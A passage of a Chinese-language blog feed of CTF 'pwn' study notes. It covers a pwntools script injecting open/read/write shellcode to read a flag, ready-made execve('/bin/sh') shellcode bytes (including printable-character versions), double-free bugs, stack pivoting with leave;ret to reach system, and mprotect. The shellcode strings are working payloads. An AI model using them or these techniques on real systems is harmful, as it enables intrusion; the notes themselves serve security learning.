class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">pay = <span class="string">b&quot;\x00\xc0&quot;</span>+shellcode</span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>由于禁用的是execve，cat用的是open调用，所以也可以这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">b&#x27;\x00\xc0&#x27;</span> + asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">pay = <span class="string">b&quot;\x00\xc0&quot;</span>+shellcode</span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shellcode限制长度</title>
      <link href="/2024/11/10/%E4%B8%8D%E5%90%8CShellcode/"/>
      <url>/2024/11/10/%E4%B8%8D%E5%90%8CShellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="Shellcode限制长度"><a href="#Shellcode限制长度" class="headerlink" title="Shellcode限制长度"></a>Shellcode限制长度</h1><h2 id="不可见字符版本"><a href="#不可见字符版本" class="headerlink" title="不可见字符版本"></a>不可见字符版本</h2><h3 id="32位（21字节）："><a href="#32位（21字节）：" class="headerlink" title="32位（21字节）："></a>32位（21字节）：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br></pre></td></tr></table></figure><h3 id="64位（23字节）："><a href="#64位（23字节）：" class="headerlink" title="64位（23字节）："></a>64位（23字节）：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br></pre></td></tr></table></figure><h2 id="可见字符版本"><a href="#可见字符版本" class="headerlink" title="可见字符版本"></a>可见字符版本</h2><h3 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIRJTKV8MIPR2FU86M3SLIZG2H6O43SX30586OCRCYBNLIM3QBKXDHS0C0EPVOE22IBNFO3CBH5P0WQCK9KQXMK0AA</span><br></pre></td></tr></table></figure><h3 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF漏洞</title>
      <link href="/2024/11/10/Use-after-free/"/>
      <url>/2024/11/10/Use-after-free/</url>
      
        <content type="html"><![CDATA[<h1 id="UAF-use-after-free-漏洞"><a href="#UAF-use-after-free-漏洞" class="headerlink" title="UAF(use after free)漏洞"></a>UAF(use after free)漏洞</h1><h2 id="Double-Free（双重释放漏洞）"><a href="#Double-Free（双重释放漏洞）" class="headerlink" title="Double Free（双重释放漏洞）"></a>Double Free（双重释放漏洞）</h2><p>Double Free，即双重释放，是指在程序中对同一块内存使用 <code>free()</code> 函数（在C或C++语言中）释放两次。这种情况通常发生在手动管理内存的编程语言中，如C和C++。当一个动态分配的内存块不再需要时，应该通过调用 <code>free()</code> 函数来释放这块内存。然而，如果这块内存已经被释放过一次，再次尝试释放就会导致“双重释放”的错误。</p><h3 id="双重释放形成的原因"><a href="#双重释放形成的原因" class="headerlink" title="双重释放形成的原因"></a>双重释放形成的原因</h3><h4 id="重复调用-free-：对同一个指针两次调用-free-，而没有在第一次释放后将其置为-NULL。"><a href="#重复调用-free-：对同一个指针两次调用-free-，而没有在第一次释放后将其置为-NULL。" class="headerlink" title="重复调用 free()：对同一个指针两次调用 free()，而没有在第一次释放后将其置为 NULL。"></a><strong>重复调用 <code>free()</code></strong>：对同一个指针两次调用 <code>free()</code>，而没有在第一次释放后将其置为 <code>NULL</code>。</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(ptr);</span><br><span class="line">free(ptr); // 双重释放</span><br></pre></td></tr></table></figure><h4 id="未置空的指针：释放内存后没有将指针置为-NULL，后续误操作再次释放。"><a href="#未置空的指针：释放内存后没有将指针置为-NULL，后续误操作再次释放。" class="headerlink" title="未置空的指针：释放内存后没有将指针置为 NULL，后续误操作再次释放。"></a><strong>未置空的指针</strong>：释放内存后没有将指针置为 <code>NULL</code>，后续误操作再次释放。</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(ptr);</span><br><span class="line">// 没有 ptr = NULL;</span><br><span class="line">free(ptr); // 错误</span><br></pre></td></tr></table></figure><h4 id="多个指针指向同一块内存：两个指针指向同一块动态分配的内存，分别对其调用-free-。"><a href="#多个指针指向同一块内存：两个指针指向同一块动态分配的内存，分别对其调用-free-。" class="headerlink" title="多个指针指向同一块内存：两个指针指向同一块动态分配的内存，分别对其调用 free()。"></a><strong>多个指针指向同一块内存</strong>：两个指针指向同一块动态分配的内存，分别对其调用 <code>free()</code>。</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int *p1 = malloc(sizeof(int));</span><br><span class="line">int *p2 = p1;</span><br><span class="line">free(p1);</span><br><span class="line">free(p2); // 双重释放</span><br></pre></td></tr></table></figure><h4 id="错误的对象管理："><a href="#错误的对象管理：" class="headerlink" title="错误的对象管理："></a><strong>错误的对象管理</strong>：</h4><p>在C++中，如果类的对象包含动态分配的资源，但未正确实现拷贝构造函数或赋值操作符（深拷贝），可能导致两个对象尝试释放同一块内存。</p><h4 id="多线程竞争："><a href="#多线程竞争：" class="headerlink" title="多线程竞争："></a><strong>多线程竞争</strong>：</h4><p>多个线程同时释放同一块内存，缺乏同步保护。</p><h4 id="库函数误用："><a href="#库函数误用：" class="headerlink" title="库函数误用："></a><strong>库函数误用</strong>：</h4><p>某些库函数可能已经释放了传入的内存，外部又再次释放。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移</title>
      <link href="/2024/11/10/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2024/11/10/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="栈迁移：一种精巧的栈空间操控技术"><a href="#栈迁移：一种精巧的栈空间操控技术" class="headerlink" title="栈迁移：一种精巧的栈空间操控技术"></a>栈迁移：一种精巧的栈空间操控技术</h1><h2 id="栈迁移是什么？"><a href="#栈迁移是什么？" class="headerlink" title="栈迁移是什么？"></a>栈迁移是什么？</h2><p>想象一下你的程序正在执行，突然发现当前的“工作台”（栈空间）太小了，放不下需要的工具和数据。这时候，栈迁移就像是为程序搬了个新家——把执行环境整体搬迁到更宽敞的地方，无论是bss段还是栈的其他区域都可以成为新的落脚点。</p><h2 id="为什么需要栈迁移？"><a href="#为什么需要栈迁移？" class="headerlink" title="为什么需要栈迁移？"></a>为什么需要栈迁移？</h2><h3 id="应用场景分析"><a href="#应用场景分析" class="headerlink" title="应用场景分析"></a>应用场景分析</h3><p>当你遇到这两种情况时，栈迁移就派上用场了：</p><ul><li><strong>空间严重不足</strong>：溢出的长度只够覆盖ebp，连返回地址都碰不到</li><li><strong>刚好但不够用</strong>：虽然能覆盖返回地址，但后面的参数区域太短，payload塞不进去</li></ul><p>简单来说，就是<strong>原来的栈空间不够发挥，需要换个场地大展拳脚</strong>。</p><h2 id="技术核心"><a href="#技术核心" class="headerlink" title="技术核心"></a>技术核心</h2><h3 id="理解关键指令"><a href="#理解关键指令" class="headerlink" title="理解关键指令"></a>理解关键指令</h3><p>栈迁移的魔法主要依靠<code>leave;ret</code>这个指令组合的两次精彩演出。</p><p><strong>leave指令分解</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp    ; 让栈顶指针指向当前栈底</span><br><span class="line">pop ebp         ; 将栈顶内容弹出到ebp寄存器</span><br></pre></td></tr></table></figure><p>这个过程相当于先确定新的工作基准点，然后更新基址指针。</p><p><strong>ret指令作用</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eip         ; 将栈顶内容作为下一条指令地址</span><br></pre></td></tr></table></figure><p>这是程序执行流的转向器，决定了接下来要去哪里。</p><h2 id="栈迁移实战解析"><a href="#栈迁移实战解析" class="headerlink" title="栈迁移实战解析"></a>栈迁移实战解析</h2><h3 id="第一阶段："><a href="#第一阶段：" class="headerlink" title="第一阶段："></a>第一阶段：</h3><p>首先通过溢出漏洞，我们做了两件关键事：</p><ol><li>把ebp的内容替换成目标迁移地址</li><li>将返回地址覆盖为<code>leave;ret</code>的地址</li></ol><p>此时main函数结束</p><h3 id="第二阶段："><a href="#第二阶段：" class="headerlink" title="第二阶段："></a>第二阶段：</h3><h4 id="第一次leave-ret"><a href="#第一次leave-ret" class="headerlink" title="第一次leave;ret"></a>第一次leave;ret</h4><ul><li><strong>leave执行</strong>：<code>mov esp, ebp</code>让两个指针汇合，接着<code>pop ebp</code>时出现了转折——ebp被我们预设的迁移地址填充</li><li><strong>ret执行</strong>：<code>pop eip</code>将我们准备好的<code>leave;ret</code>地址装入，为第二次迁移做准备</li></ul><blockquote><p>为什么需要两次leave;ret？<br>因为main函数正常结束只会执行一次leave;ret，我们要实现完美迁移，就必须再来一次！</p></blockquote><h3 id="第三阶段："><a href="#第三阶段：" class="headerlink" title="第三阶段："></a>第三阶段：</h3><p>第二次执行leave时，真正的迁移发生了：</p><ul><li><code>mov esp, ebp</code>：此时esp指向了我们设定的新地址</li><li><code>pop ebp</code>：更新ebp，同时esp自动下移一个单元</li></ul><p>最后，当ret执行时，栈顶的system函数地址被弹入eip，成功GetShell！</p><h2 id="技术要点总结"><a href="#技术要点总结" class="headerlink" title="技术要点总结"></a>技术要点总结</h2><p>栈迁移的精髓可以概括为：</p><ul><li><strong>第一次leave;ret</strong>：把ebp“骗”到目标位置</li><li><strong>第二次leave;ret</strong>：让esp跟上脚步，同时为system调用铺好道路</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN静态编译</title>
      <link href="/2024/11/10/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91/"/>
      <url>/2024/11/10/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN静态编译"><a href="#PWN静态编译" class="headerlink" title="PWN静态编译"></a>PWN静态编译</h1><p><img src="https://sirius776.oss-cn-beijing.aliyuncs.com/image-20251009164235890.png" alt="image-20251009164235890"></p><h2 id="mprotect函数"><a href="#mprotect函数" class="headerlink" title="mprotect函数"></a>mprotect函数</h2><p>mprotect()函数可以修改调用进程内存页的保护属性，如果调用进程尝试以违反保护属性的方式访问该内存，则内核会发出一个SIGSEGV信号给该进程。<br>#include &lt;sys&#x2F;mman.h&gt;<br>int mprotect(void *addr, size_t len, int prot);<br>addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB &#x3D;&#x3D; 4096字节）整数倍。<br>len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。<br>prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：<br>1）PROT_READ：内存段可读；<br>2）PROT_WRITE：内存段可写；<br>3）PROT_EXEC：内存段可执行；<br>4）PROT_NONE：内存段不可访问。<br>返回值：0；成功，-1；失败（并且errno被设置）<br>1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。<br>2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。<br>3）ENOMEM：内核内部的结构体无法分配。<br>这里的参数prot：<br>r:4<br>w:2<br>x:1<br>prot为7（1+2+4）就是rwx可读可写可执行，与linux文件属性用法类似</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态编译 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
